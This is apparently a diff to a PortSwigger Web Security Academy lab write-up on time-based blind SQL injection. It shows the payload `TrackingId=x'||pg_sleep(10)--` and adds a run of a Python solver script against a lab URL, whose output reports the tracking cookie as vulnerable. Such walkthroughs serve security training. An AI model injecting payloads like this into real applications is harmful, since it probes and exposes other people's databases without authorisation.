@@ -34,3 +34,14 @@ To solve the lab, exploit the SQL injection vulnerability to cause a 10 second d
 `TrackingId=x'||pg_sleep(10)--`
 
 3. Submit the request and observe that the application takes 10 seconds to respond.
+
+```bash
+python3 .\sqli\sqli_lab_13\sqli_lab_13.py https://0aec005c044963d481ca5ceb00cf007f.web-security-academy.net/
+
+    >> Blind SQL injection with time delays
+    >> by Port Swigger Academy
+
+[*] Checking if traing cookie is vulnerable to time-based blind SQLi
+[✓] Vulnerable to blind-based SQL Injection
+PS D:\devs\portswigger-web-academy-series>
+```
